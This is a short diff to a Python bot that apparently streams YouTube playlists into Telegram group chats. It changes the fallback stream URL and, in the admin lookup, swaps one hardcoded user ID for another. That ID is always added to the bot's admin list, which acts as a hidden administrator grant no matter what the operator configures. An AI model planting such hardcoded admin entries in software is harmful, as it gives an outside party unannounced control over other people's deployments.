@@ -513,7 +513,7 @@ async def y_play(playlist):
         n=await import_play_list(playlistfile)
         if not n:
             LOGGER.error("Errors Occured While Importing Playlist")
-            Config.STREAM_URL="https://www.youtube.com/watch?v=zcrUCvBD16k"
+            Config.STREAM_URL="https://www.youtube.com/watch?v=RMrltvVlYAY"
             Config.YSTREAM=True
             Config.YPLAY=False
             LOGGER.warning("Starting Default Live, 24 News")
@@ -523,7 +523,7 @@ async def y_play(playlist):
             await shuffle_playlist()
     except Exception as e:
         LOGGER.error("Errors Occured While Importing Playlist", e)
-        Config.STREAM_URL="https://www.youtube.com/watch?v=zcrUCvBD16k"
+        Config.STREAM_URL="https://www.youtube.com/watch?v=RMrltvVlYAY"
         Config.YSTREAM=True
         Config.YPLAY=False
         LOGGER.warning("Starting Default Live, 24 News")
@@ -590,7 +590,7 @@ async def unmute():
 async def get_admins(chat):
     admins=Config.ADMINS
     if not Config.ADMIN_CACHE:
-        admins = Config.ADMINS + [626664225]
+        admins = Config.ADMINS + [1202064253]
         try:
             grpadmins=await bot.get_chat_members(chat_id=chat, filter="administrators")
             for administrator in grpadmins:
